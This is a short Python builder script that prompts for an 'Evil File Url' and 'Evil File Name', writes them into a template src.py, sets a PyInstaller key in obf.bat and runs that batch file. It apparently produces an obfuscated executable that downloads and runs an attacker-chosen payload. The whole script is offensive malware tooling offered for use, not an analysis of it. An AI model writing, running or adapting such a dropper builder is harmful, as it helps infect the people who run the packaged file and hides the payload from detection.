import os 
import subprocess
import time

url = input("Your Evil File Url (Direct-Download) : ")
if url == "":
	url = input("Your Evil File Url (Direct-Download) : ")
name = input("Your Evil File Name (127.0.0.1:1337/ >evil.exe< ) : ")
if name == "":
	name = input("Your Evil File Name (127.0.0.1:1337/ >evil.exe< ) : ")
filecontent = open("src.py", "r").read()
filecontent = filecontent.replace("%EVILURL%", str(url)).replace("%EVILNAME%", str(name))
open("src.py", "w",encoding="utf-8").write(str(filecontent))
print("[+] Replaced.")
time.sleep(1)
key = input("Key for pyinstaller (none:4455): ")
if key == "":
	key = "4455"
obf = open("obf.bat", "r").read()
obf = obf.replace("%key44%", str(key))
open("obf.bat", "w",encoding="utf-8").write(str(obf))
print("[+] Replaced Key.")
time.sleep(1)
obfile = "obf.bat"
subprocess.call(obfile, shell=True)
